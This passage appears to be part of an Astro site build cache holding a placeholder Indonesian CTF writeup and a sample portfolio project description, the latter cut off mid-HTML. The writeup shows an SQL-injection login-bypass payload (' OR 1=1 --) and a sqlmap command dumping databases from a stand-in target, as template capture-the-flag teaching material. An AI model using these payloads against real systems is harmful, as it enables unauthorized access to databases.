riteup untuk challenge web CTF yang melibatkan SQL injection dan XSS bypass.",["Date","2026-08-20T00:00:00.000Z"],[18,19,20,21],"CTF","web","sql-injection","xss",false,"> Ganti konten ini dengan writeup CTF kamu yang sebenarnya.\n\n## Overview\n\nChallenge ini merupakan bagian dari **Sample CTF 2026**, kategori Web Exploitation.\n\n- **Poin:** 500\n- **Solve:** 12 teams\n\n## Analysis\n\nSetelah membuka website target, kita menemukan form login sederhana. Dengan memasukkan payload `' OR 1=1 --`, kita bisa bypass autentikasi.\n\n```sql\nSELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '...'\n```\n\n## Exploitation\n\nSelanjutnya, kita menggunakan `sqlmap` untuk dump database:\n\n```bash\nsqlmap -u \"http://target.ctf/login\" --data=\"username=admin&password=test\" --dbs\n```\n\nOutput:\n```\n[*] available databases:\n[1] ctf_db\n[2] information_schema\n```\n\n## Flag\n\n```\nFLAG{s4mpl3_fl4g_g4nti_dengan_flag_aslimu}\n```","src/content/posts/contoh-ctf-writeup.md","888d0054c1965f4b",{"html":27,"metadata":28},"\u003Cblockquote>\n\u003Cp>Ganti konten ini dengan writeup CTF kamu yang sebenarnya.\u003C/p>\n\u003C/blockquote>\n\u003Ch2 id=\"overview\">Overview\u003C/h2>\n\u003Cp>Challenge ini merupakan bagian dari \u003Cstrong>Sample CTF 2026\u003C/strong>, kategori Web Exploitation.\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>Poin:\u003C/strong> 500\u003C/li>\n\u003Cli>\u003Cstrong>Solve:\u003C/strong> 12 teams\u003C/li>\n\u003C/ul>\n\u003Ch2 id=\"analysis\">Analysis\u003C/h2>\n\u003Cp>Setelah membuka website target, kita menemukan form login sederhana. Dengan memasukkan payload \u003Ccode>' OR 1=1 --\u003C/code>, kita bisa bypass autentikasi.\u003C/p>\n\u003Cpre class=\"astro-code one-dark-pro\" style=\"background-color:#282c34;color:#abb2bf; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"sql\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#C678DD\">SELECT\u003C/span>\u003Cspan style=\"color:#ABB2BF\"> * \u003C/span>\u003Cspan style=\"color:#C678DD\">FROM\u003C/span>\u003Cspan style=\"color:#ABB2BF\"> users \u003C/span>\u003Cspan style=\"color:#C678DD\">WHERE\u003C/span>\u003Cspan style=\"color:#ABB2BF\"> username \u003C/span>\u003Cspan style=\"color:#56B6C2\">=\u003C/span>\u003Cspan style=\"color:#98C379\"> ''\u003C/span>\u003Cspan style=\"color:#C678DD\"> OR\u003C/span>\u003Cspan style=\"color:#D19A66\"> 1\u003C/span>\u003Cspan style=\"color:#56B6C2\">=\u003C/span>\u003Cspan style=\"color:#D19A66\">1\u003C/span>\u003Cspan style=\"color:#7F848E;font-style:italic\"> -- ' AND password = '...'\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"exploitation\">Exploitation\u003C/h2>\n\u003Cp>Selanjutnya, kita menggunakan \u003Ccode>sqlmap\u003C/code> untuk dump database:\u003C/p>\n\u003Cpre class=\"astro-code one-dark-pro\" style=\"background-color:#282c34;color:#abb2bf; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#61AFEF\">sqlmap\u003C/span>\u003Cspan style=\"color:#D19A66\"> -u\u003C/span>\u003Cspan style=\"color:#98C379\"> \"http://target.ctf/login\"\u003C/span>\u003Cspan style=\"color:#D19A66\"> --data=\u003C/span>\u003Cspan style=\"color:#98C379\">\"username=admin&amp;password=test\"\u003C/span>\u003Cspan style=\"color:#D19A66\"> --dbs\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Output:\u003C/p>\n\u003Cpre class=\"astro-code one-dark-pro\" style=\"background-color:#282c34;color:#abb2bf; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>[*] available databases:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[1] ctf_db\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[2] information_schema\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"flag\">Flag\u003C/h2>\n\u003Cpre class=\"astro-code one-dark-pro\" style=\"background-color:#282c34;color:#abb2bf; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>FLAG{s4mpl3_fl4g_g4nti_dengan_flag_aslimu}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n",{"headings":29,"localImagePaths":43,"remoteImagePaths":44,"frontmatter":45,"imagePaths":48},[30,34,37,40],{"depth":31,"slug":32,"text":33},2,"overview","Overview",{"depth":31,"slug":35,"text":36},"analysis","Analysis",{"depth":31,"slug":38,"text":39},"exploitation","Exploitation",{"depth":31,"slug":41,"text":42},"flag","Flag",[],[],{"title":14,"description":15,"publishDate":46,"tags":47},["Date","2026-08-20T00:00:00.000Z"],[18,19,20,21],[],"projects",["Map",51,52,87,88],"portfolio-website",{"id":51,"data":53,"body":65,"filePath":66,"digest":67,"rendered":68},{"title":54,"description":55,"publishDate":56,"tags":57,"thumbnail":62,"repoUrl":63,"liveUrl":64,"draft":22},"Contoh Proyek – Portfolio Website","Website portofolio pribadi dibangun dengan Astro, Tailwind CSS, dan Markdown. Mendukung dark mode, posts, dan projects.",["Date","2026-08-20T00:00:00.000Z"],[58,59,60,61],"Astro","Tailwind CSS","Web","Portfolio","portfolio-preview.png","https://github.com/alatbekam/alatbekam.github.io","https://alatbekam.github.io","> Ganti konten ini dengan deskripsi proyek kamu yang sebenarnya.\n\n## Tentang Proyek\n\nPortfolio website pribadi yang dibangun menggunakan **Astro** sebagai framework utama, dengan fitur:\n\n- ✅ Dark mode / Light mode toggle\n- ✅ Posts untuk CTF writeup\n- ✅ Projects dengan thumbnail\n- ✅ Markdown/MDX support\n- ✅ Table of Contents sticky\n- ✅ Deploy otomatis ke GitHub Pages\n\n## Tech Stack\n\n| Teknologi | Kegunaan |\n|-----------|----------|\n| Astro     | Framework SSG |\n| Tailwind CSS v4 | Styling |\n| MDX       | Markdown extended |\n| Shiki     | Syntax highlighting |\n| GitHub Pages | Hosting |\n\n## Cara Menjalankan\n\n```bash\n# Install dependencies\nnpm install\n\n# Jalankan dev server\nnpm run dev\n\n# Build untuk production\nnpm run build\n```","src/content/projects/portfolio-website.md","de7becce04caace1",{"html":69,"metadata":70},"\u003Cblockquote>\n\u003Cp>Ganti konten ini dengan deskripsi proyek kamu yang sebenarnya.\u003C/p>\n\u003C/blockquote>\n\u003Ch2 id=\"tentang-proyek\">Tentang Proyek\u003C/h2>\n\u003Cp>Portfolio website pribadi yang dibangun menggunakan \u003Cstrong>Astro\u003C/strong> sebagai framework utama, dengan fitur:\u003C/p>\n\u003Cul>\n\u003Cli>✅ Dark mode / Light mode toggle\u003C/li>\n\u003Cli>✅ Posts untuk CTF writeup\u003C/li>\n\u003Cli>✅ Projects dengan thumbnail\u003C/li>\n\u003Cli>✅ Markdown/MDX support\u003C/li>\n\u003Cli>✅ Table of Contents sticky\u003C/li>\n\u003Cli>✅ Deploy otomatis ke GitHub Pages\u003C/li>\n\u003C/ul>\n\u003Ch2 id=\"tech-stack\">Tech Stack\u003C/h2>\n\u003Ctable>\n\u003Cthead>\n\u003Ctr>\n\u003Cth>Teknologi\u003C/th>\n\u003Cth>Kegunaan\u003C/th>\n\u003C/tr>\n\u003C/thead>\n\u003Ctbody>\n\u003Ctr>\n\u003Ctd>Astro\u003C/td>\n\u003Ctd>Framework SSG\u003C/td>\n\u003C/tr>\n\u003Ctr>\n\u003Ctd>Tailwind CSS v4\u003C/td>\n\u003Ctd>Styling\u003C/td>\n\u003C/tr>\n\u003Ctr>\n\u003Ctd>MDX\u003C/td>\n\u003Ctd>Markdown extended\u003C/td>\n\u003C/tr>\n\u003Ctr>\n\u003Ctd>Shiki\u003C/td>\n\u003Ctd>Syntax highlighting\u003C/td>\n\u003C/tr>\n\u003Ctr>\n\u003Ctd>GitHub Pages\u003C/td>\n\u003Ctd>Hosting\u003C/td>\n\u003C/tr>\n\u003C/tbody>\n\u003C/table>\n\u003Ch2 id=\"cara-menjalankan\">Cara Menjalankan\u003C/h2>\n\u003Cpre class=\"astro-code one-dark-pro\" style=\"background-color:#282c34;color:#abb2bf; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#7F848E;font-style:italic\"># Install dependencies\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#61AFEF\">npm\u003C/span>\u003Cspan style=\"co